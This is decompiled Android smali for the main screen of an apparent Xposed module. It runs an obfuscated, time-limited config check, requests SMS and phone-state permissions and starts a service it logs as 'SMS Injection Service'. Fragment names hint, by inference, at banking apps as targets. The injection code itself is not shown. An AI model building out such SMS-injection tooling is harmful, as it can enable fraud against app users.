.class public Lcom/rebel/module/MainActivity;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "MainActivity.java"


# instance fields
.field private appPager:Landroidx/viewpager2/widget/ViewPager2;

.field private bottomNav:Lcom/google/android/material/bottomnavigation/BottomNavigationView;

.field private pagerAdapter:Lcom/rebel/module/AppPagerAdapter;

.field private settingsFragment:Lcom/rebel/module/SettingsFragment;

.field private showingSettings:Z

.field private statusText:Landroid/widget/TextView;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 20
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    .line 31
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/rebel/module/MainActivity;->showingSettings:Z

    return-void
.end method

.method private c0xa1b2()V
    .locals 3

    .line 206
    :try_start_0
    new-instance v0, Ljava/io/File;

    const-string v1, "/data/local/tmp/src_module_config.json"

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 208
    :goto_0
    :try_start_1
    const-string v0, "src_login"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/rebel/module/MainActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 209
    .local v0, "p":Landroid/content/SharedPreferences;
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->clear()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .end local v0    # "p":Landroid/content/SharedPreferences;
    goto :goto_1

    .line 210
    :catch_1
    move-exception v0

    :goto_1
    nop

    .line 211
    :try_start_2
    new-instance v0, Ljava/io/File;

    invoke-virtual {p0}, Lcom/rebel/module/MainActivity;->getFilesDir()Ljava/io/File;

    move-result-object v1

    const-string v2, "session.json"

    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->delete()Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_2

    :catch_2
    move-exception v0

    .line 212
    :goto_2
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/rebel/module/LoginActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 213
    .local v0, "i":Landroid/content/Intent;
    const/high16 v1, 0x14000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 214
    invoke-virtual {p0, v0}, Lcom/rebel/module/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 215
    invoke-virtual {p0}, Lcom/rebel/module/MainActivity;->finish()V

    .line 216
    return-void
.end method

.method private c0xf3e7()Z
    .locals 18

    .line 169
    const/4 v1, 0x0

    :try_start_0
    new-instance v0, Ljava/io/File;

    const-string v2, "/data/local/tmp/src_module_config.json"

    invoke-direct {v0, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 170
    .local v0, "f":Ljava/io/File;
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_c

    invoke-virtual {v0}, Ljava/io/File;->canRead()Z

    move-result v2

    if-nez v2, :cond_0

    move/from16 v16, v1

    goto/16 :goto_3

    .line 171
    :cond_0
    new-instance v2, Ljava/io/BufferedReader;

    new-instance v3, Ljava/io/FileReader;

    invoke-direct {v3, v0}, Ljava/io/FileReader;-><init>(Ljava/io/File;)V

    invoke-direct {v2, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 172
    .local v2, "br":Ljava/io/BufferedReader;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    .line 174
    .local v3, "sb":Ljava/lang/StringBuilder;
    :goto_0
    invoke-virtual {v2}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v4

    move-object v5, v4

    .local v5, "line":Ljava/lang/String;
    if-eqz v4, :cond_1

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_0

    .line 175
    :cond_1
    invoke-virtual {v2}, Ljava/io/BufferedReader;->close()V

    .line 176
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 178
    .local v4, "c":Ljava/lang/String;
    const-string v6, "\"isRoot\""

    invoke-virtual {v4, v6}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v6

    .line 179
    .local v6, "p":I
    if-gez v6, :cond_2

    return v1

    .line 180
    :cond_2
    add-int/lit8 v7, v6, 0x8

    const/16 v8, 0x22

    invoke-virtual {v4, v8, v7}, Ljava/lang/String;->indexOf(II)I

    move-result v7

    .line 181
    .end local v6    # "p":I
    .local v7, "p":I
    if-gez v7, :cond_3

    return v1

    .line 182
    :cond_3
    add-int/lit8 v6, v7, 0x1

    invoke-virtual {v4, v8, v6}, Ljava/lang/String;->indexOf(II)I

    move-result v6

    .line 183
    .local v6, "e":I
    add-int/lit8 v8, v7, 0x1

    if-gt v6, v8, :cond_4

    return v1

    .line 184
    :cond_4
    add-int/lit8 v8, v7, 0x1

    invoke-virtual {v4, v8, v6}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v8

    .line 185
    .local v8, "t":Ljava/lang/String;
    invoke-virtual {v8}, Ljava/lang/String;->isEmpty()Z

    move-result v9

    if-eqz v9, :cond_5

    return v1

    .line 187
    :cond_5
    const-wide/16 v9, 0x0

    .line 188
    .local v9, "v":J
    const/4 v11, 0x0

    .local v11, "i":I
    :goto_1
    invoke-virtual {v8}, Ljava/lang/String;->length()I

    move-result v12

    if-ge v11, v12, :cond_a

    .line 189
    invoke-virtual {v8, v11}, Ljava/lang/String;->charAt(I)C

    move-result v12
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 190
    .local v12, "ch":C
    const/16 v13, 0x30

    if-lt v12, v13, :cond_6

    const/16 v13, 0x39

    if-gt v12, v13, :cond_6

    add-int/lit8 v13, v12, -0x30

    goto :goto_2

    .line 191
    :cond_6
    const/16 v13, 0x61

    if-lt v12, v13, :cond_7

    const/16 v13, 0x66

    if-gt v12, v13, :cond_7

    add-int/lit8 v13, v12, -0x61

    add-int/lit8 v13, v13, 0xa

    goto :goto_2

    .line 192
    :cond_7
    const/16 v13, 0x41

    if-lt v12, v13, :cond_8

    const/16 v13, 0x46

    if-gt v12, v13, :cond_8

    add-int/lit8 v13, v12, -0x41

    add-int/lit8 v13, v13, 0xa

    goto :goto_2

    :cond_8
    const/4 v13, -0x1

    :goto_2
    nop

    .line 193
    .local v13, "d":I
    if-gez v13, :cond_9

    return v1

    .line 194
    :cond_9
    const/4 v14, 0x4

    shl-long v14, v9, v14

    move/from16 v16, v1

    move-object/from16 v17, v2

    .end local v2    # "br":Ljava/io/BufferedReader;
    .local v17, "br":Ljava/io/BufferedReader;
    int-to-long v1, v13

    or-long v9, v14, v1

    .line 188
    .end local v12    # "ch":C
    .end local v13    # "d":I
    add-int/lit8 v11, v11, 0x1

    move/from16 v1, v16

    move-object/from16 v2, v17

    goto :goto_1

    .end local v17    # "br":Ljava/io/BufferedReader;
    .restart local v2    # "br":Ljava/io/BufferedReader;
    :cond_a
    move/from16 v16, v1

    move-object/from16 v17, v2

    .line 196
    .end local v2    # "br":Ljava/io/BufferedReader;
    .end local v11    # "i":I
    .restart local v17    # "br":Ljava/io/BufferedReader;
    const-wide/32 v1, 0x5a3c7e1d

    xor-long/2addr v1, v9

    .line 197
    .local v1, "ts":J
    :try_start_1
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v11

    const-wide/16 v13, 0x3e8

    div-long/2addr v11, v13

    sub-long/2addr v11, v1

    invoke-static {v11, v12}, Ljava/lang/Math;->abs(J)J

    move-result-wide v11
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 198
    .local v11, "age":J
    const-wide/32 v13, 0x15180

    cmp-long v13, v11, v13

    if-gtz v13, :cond_b

    const/4 v13, 0x1

    move/from16 v16, v13

    :cond_b
    return v16

    .line 199
    .end local v0    # "f":Ljava/io/File;
    .end local v1    # "ts":J
    .end local v3    # "sb":Ljava/lang/StringBuilder;
    .end local v4    # "c":Ljava/lang/String;
    .end local v5    # "line":Ljava/lang/String;
    .end local v6    # "e":I
    .end local v7    # "p":I
    .end local v8    # "t":Ljava/lang/String;
    .end local v9    # "v":J
    .end local v11    # "age":J
    .end local v17    # "br":Ljava/io/BufferedReader;
    :catch_0
    move-exception v0

    goto :goto_4

    .line 170
    .restart local v0    # "f":Ljava/io/File;
    :cond_c
    move/from16 v16, v1

    :goto_3
    return v16

    .line 199
    .end local v0    # "f":Ljava/io/File;
    :catch_1
    move-exception v0

    move/from16 v16, v1

    .line 200
    .local v0, "ex":Ljava/lang/Exception;
    :goto_4
    return v16
.end method

.method private isModuleActive()Z
    .locals 1

    .line 134
    const/4 v0, 0x0

    return v0
.end method

.method private requestRequiredPermissions()V
    .locals 8

    .line 138
    const/4 v0, 0x5

    new-array v0, v0, [Ljava/lang/String;

    const-string v1, "android.permission.SEND_SMS"

    const/4 v2, 0x0

    aput-object v1, v0, v2

    const-string v1, "android.permission.READ_SMS"

    const/4 v3, 0x1

    aput-object v1, v0, v3

    const/4 v1, 0x2

    const-string v4, "android.permission.RECEIVE_SMS"

    aput-object v4, v0, v1

    const/4 v1, 0x3

    const-string v4, "android.permission.READ_PHONE_STATE"

    aput-object v4, v0, v1

    const/4 v1, 0x4

    const-string v4, "android.permission.INTERNET"

    aput-object v4, v0, v1

    .line 146
    .local v0, "permissions":[Ljava/lang/String;
    const/4 v1, 0x0

    .line 147
    .local v1, "needsRequest":Z
    array-length v4, v0

    move v5, v2

    :goto_0
    if-ge v5, v4, :cond_1

    aget-object v6, v0, v5

    .line 148
    .local v6, "perm":Ljava/lang/String;
    invoke-static {p0, v6}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v7

    if-eqz v7, :cond_0

    .line 149
    const/4 v1, 0x1

    .line 150
    goto :goto_1

    .line 147
    .end local v6    # "perm":Ljava/lang/String;
    :cond_0
    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    .line 154
    :cond_1
    :goto_1
    if-eqz v1, :cond_2

    .line 155
    const/16 v4, 0x64

    invoke-static {p0, v0, v4}, Landroidx/core/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    .line 159
    :cond_2
    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v5, 0x21

    if-lt v4, v5, :cond_3

    .line 160
    const-string v4, "android.permission.POST_NOTIFICATIONS"

    invoke-static {p0, v4}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v5

    if-eqz v5, :cond_3

    .line 161
    new-array v3, v3, [Ljava/lang/String;

    aput-object v4, v3, v2

    const/16 v2, 0x65

    invoke-static {p0, v3, v2}, Landroidx/core/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    .line 164
    :cond_3
    return-void
.end method

.method private updateModuleStatus()V
    .locals 3

    .line 124
    invoke-direct {p0}, Lcom/rebel/module/MainActivity;->isModuleActive()Z

    move-result v0

    .line 125
    .local v0, "isModuleActive":Z
    nop

    .line 128
    iget-object v1, p0, Lcom/rebel/module/MainActivity;->statusText:Landroid/widget/TextView;

    .line 125
    if-eqz v0, :cond_0

    .line 126
    sget v2, Lcom/rebel/module/R$string;->xposed_active:I

    invoke-virtual {p0, v2}, Lcom/rebel/module/MainActivity;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_0

    .line 128
    :cond_0
    sget v2, Lcom/rebel/module/R$string;->xposed_not_active:I

    invoke-virtual {p0, v2}, Lcom/rebel/module/MainActivity;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 130
    :goto_0
    return-void
.end method


# virtual methods
.method synthetic lambda$onCreate$0$com-src-module-MainActivity(Landroid/view/MenuItem;)Z
    .locals 5
    .param p1, "item"    # Landroid/view/MenuItem;

    .line 90
    invoke-interface {p1}, Landroid/view/MenuItem;->getItemId()I

    move-result v0

    .line 92
    .local v0, "itemId":I
    sget v1, Lcom/rebel/module/R$id;->nav_esaf:I

    const/4 v2, 0x1

    const/16 v3, 0x8

    const/4 v4, 0x0

    if-ne v0, v1, :cond_0

    .line 94
    iget-object v1, p0, Lcom/rebel/module/MainActivity;->appPager:Landroidx/viewpager2/widget/ViewPager2;

    invoke-virtual {v1, v4}, Landroidx/viewpager2/widget/ViewPager2;->setVisibility(I)V

    .line 95
    sget v1, Lcom/rebel/module/R$id;->pageIndicator:I

    invoke-virtual {p0, v1}, Lcom/rebel/module/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    invoke-virtual {v1, v4}, Landroid/view/View;->setVisibility(I)V

    .line 96
    sget v1, Lcom/rebel/module/R$id;->settingsContainer:I

    invoke-virtual {p0, v1}, Lcom/rebel/module/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    invoke-virtual {v1, v3}, Landroid/view/View;->setVisibility(I)V

    .line 97
    iput-boolean v4, p0, Lcom/rebel/module/MainActivity;->showingSettings:Z

    goto :goto_0

    .line 98
    :cond_0
    sget v1, Lcom/rebel/module/R$id;->nav_settings:I

    if-ne v0, v1, :cond_1

    .line 100
    iget-object v1, p0, Lcom/rebel/module/MainActivity;->appPager:Landroidx/viewpager2/widget/ViewPager2;

    invoke-virtual {v1, v3}, Landroidx/viewpager2/widget/ViewPager2;->setVisibility(I)V

    .line 101
    sget v1, Lcom/rebel/module/R$id;->pageIndicator:I

    invoke-virtual {p0, v1}, Lcom/rebel/module/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    invoke-virtual {v1, v3}, Landroid/view/View;->setVisibility(I)V

    .line 102
    sget v1, Lcom/rebel/module/R$id;->settingsContainer:I

    invoke-virtual {p0, v1}, Lcom/rebel/module/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    invoke-virtual {v1, v4}, Landroid/view/View;->setVisibility(I)V

    .line 103
    iput-boolean v2, p0, Lcom/rebel/module/MainActivity;->showingSettings:Z

    .line 105
    :cond_1
    :goto_0
    return v2
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 5
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 35
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 38
    invoke-direct {p0}, Lcom/rebel/module/MainActivity;->c0xf3e7()Z

    move-result v0

    if-nez v0, :cond_0

    .line 40
    invoke-direct {p0}, Lcom/rebel/module/MainActivity;->c0xa1b2()V

    .line 41
    return-void

    .line 44
    :cond_0
    sget v0, Lcom/rebel/module/R$layout;->activity_main:I

    invoke-virtual {p0, v0}, Lcom/rebel/module/MainActivity;->setContentView(I)V

    .line 47
    invoke-direct {p0}, Lcom/rebel/module/MainActivity;->requestRequiredPermissions()V

    .line 50
    invoke-static {p0}, Lcom/rebel/module/SmsLogDatabase;->getInstance(Landroid/content/Context;)Lcom/rebel/module/SmsLogDatabase;

    .line 53
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/rebel/module/SmsInjectService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 54
    .local v0, "serviceIntent":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Lcom/rebel/module/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 55
    const-string v1, "MainActivity"

    const-string v2, "SMS Injection Service started"

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 58
    sget v1, Lcom/rebel/module/R$id;->statusText:I

    invoke-virtual {p0, v1}, Lcom/rebel/module/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/TextView;

    iput-object v1, p0, Lcom/rebel/module/MainActivity;->statusText:Landroid/widget/TextView;

    .line 59
    sget v1, Lcom/rebel/module/R$id;->bottomNav:I

    invoke-virtual {p0, v1}, Lcom/rebel/module/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Lcom/google/android/material/bottomnavigation/BottomNavigationView;

    iput-object v1, p0, Lcom/rebel/module/MainActivity;->bottomNav:Lcom/google/android/material/bottomnavigation/BottomNavigationView;

    .line 60
    sget v1, Lcom/rebel/module/R$id;->appPager:I

    invoke-virtual {p0, v1}, Lcom/rebel/module/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroidx/viewpager2/widget/ViewPager2;

    iput-object v1, p0, Lcom/rebel/module/MainActivity;->appPager:Landroidx/viewpager2/widget/ViewPager2;

    .line 63
    invoke-direct {p0}, Lcom/rebel/module/MainActivity;->updateModuleStatus()V

    .line 66
    new-instance v1, Lcom/rebel/module/AppPagerAdapter;

    invoke-direct {v1, p0}, Lcom/rebel/module/AppPagerAdapter;-><init>(Landroidx/fragment/app/FragmentActivity;)V

    iput-object v1, p0, Lcom/rebel/module/MainActivity;->pagerAdapter:Lcom/rebel/module/AppPagerAdapter;

    .line 67
    iget-object v1, p0, Lcom/rebel/module/MainActivity;->appPager:Landroidx/viewpager2/widget/ViewPager2;

    iget-object v2, p0, Lcom/rebel/module/MainActivity;->pagerAdapter:Lcom/rebel/module/AppPagerAdapter;

    invoke-virtual {v1, v2}, Landroidx/viewpager2/widget/ViewPager2;->setAdapter(Landroidx/recyclerview/widget/RecyclerView$Adapter;)V

    .line 70
    new-instance v1, Lcom/rebel/module/SettingsFragment;

    invoke-direct {v1}, Lcom/rebel/module/SettingsFragment;-><init>()V

    iput-object v1, p0, Lcom/rebel/module/MainActivity;->settingsFragment:Lcom/rebel/module/SettingsFragment;

    .line 73
    if-eqz p1, :cond_2

    .line 74
    invoke-virtual {p0}, Lcom/rebel/module/MainActivity;->getSupportFragmentManager()Landroidx/fragment/app/FragmentManager;

    move-result-object v1

    invoke-virtual {v1}, Landroidx/fragment/app/FragmentManager;->getFragments()Ljava/util/List;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_2

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroidx/fragment/app/Fragment;

    .line 75
    .local v2, "f":Landroidx/fragment/app/Fragment;
    instance-of v3, v2, Lcom/rebel/module/EsafFragment;

    if-nez v3, :cond_1

    instance-of v3, v2, Lcom/rebel/module/NaviFragment;

    if-nez v3, :cond_1

    .line 76
    invoke-virtual {p0}, Lcom/rebel/module/MainActivity;->getSupportFragmentManager()Landroidx/fragment/app/FragmentManager;

    move-result-object v3

    invoke-virtual {v3}, Landroidx/fragment/app/FragmentManager;->beginTransaction()Landroidx/fragment/app/FragmentTransaction;

    move-result-object v3

    invoke-virtual {v3, v2}, Landroidx/fragment/app/FragmentTransaction;->remove(Landroidx/fragment/app/Fragment;)Landroidx/fragment/app/FragmentTransaction;

    move-result-object v3

    invoke-virtual {v3}, Landroidx/fragment/app/FragmentTransaction;->commitNow()V

    .line 78
    .end local v2    # "f":Landroidx/fragment/app/Fragment;
    :cond_1
    goto :goto_0

    .line 82
    :cond_2
    invoke-virtual {p0}, Lcom/rebel/module/MainActivity;->getSupportFragmentManager()Landroidx/fragment/app/FragmentManager;

    move-result-object v1

    const-string v2, "settings"

    invoke-virtual {v1, v2}, Landroidx/fragment/app/FragmentManager;->findFragmentByTag(Ljava/lang/String;)Landroidx/fragment/app/Fragment;

    move-result-object v1

    if-nez v1, :cond_3

    .line 83
    invoke-virtual {p0}, Lcom/rebel/module/MainActivity;->getSupportFragmentManager()Landroidx/fragment/app/FragmentManager;

    move-result-object v1

    invoke-virtual {v1}, Landroidx/fragment/app/FragmentManager;->beginTransaction()Landroidx/fragment/app/FragmentTransaction;

    move-result-object v1

    sget v3, Lcom/rebel/module/R$id;->settingsContainer:I

    iget-object v4, p0, Lcom/rebel/module/MainActivity;->settingsFragment:Lcom/rebel/module/SettingsFragment;

    .line 84
    invoke-virtual {v1, v3, v4, v2}, Landroidx/fragment/app/FragmentTransaction;->add(ILandroidx/fragment/app/Fragment;Ljava/lang/String;)Landroidx/fragment/app/FragmentTransaction;

    move-result-object v1

    .line 85
    invoke-virtual {v1}, Landroidx/fragment/app/FragmentTransaction;->commit()I

    .line 89
    :cond_3
    iget-object v1, p0, Lcom/rebel/module/MainActivity;->bottomNav:Lcom/google/android/material/bottomnavigation/BottomNavigationView;

    new-instance v2, Lcom/rebel/module/MainActivity$$ExternalSyntheticLambda0;

    invoke-direct {v2, p0}, Lcom/rebel/module/MainActivity$$ExternalSyntheticLambda0;-><init>(Lcom/rebel/module/MainActivity;)V

    invoke-virtual {v1, v2}, Lcom/google/android/material/bottomnavigation/BottomNavigationView;->setOnItemSelectedListener(Lcom/google/android/material/navigation/NavigationBarView$OnItemSelectedListener;)V

    .line 109
    sget v1, Lcom/rebel/module/R$id;->pageLabel:I

    invoke-virtual {p0, v1}, Lcom/rebel/module/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/TextView;

    .line 110
    .local v1, "pageLabel":Landroid/widget/TextView;
    iget-object v2, p0, Lcom/rebel/module/MainActivity;->appPager:Landroidx/viewpager2/widget/ViewPager2;

    new-instance v3, Lcom/rebel/module/MainActivity$1;

    invoke-direct {v3, p0, v1}, Lcom/rebel/module/MainActivity$1;-><init>(Lcom/rebel/module/MainActivity;Landroid/widget/TextView;)V

    invoke-virtual {v2, v3}, Landroidx/viewpager2/widget/ViewPager2;->registerOnPageChangeCallback(Landroidx/viewpager2/widget/ViewPager2$OnPageChangeCallback;)V

    .line 120
    return-void
.end method
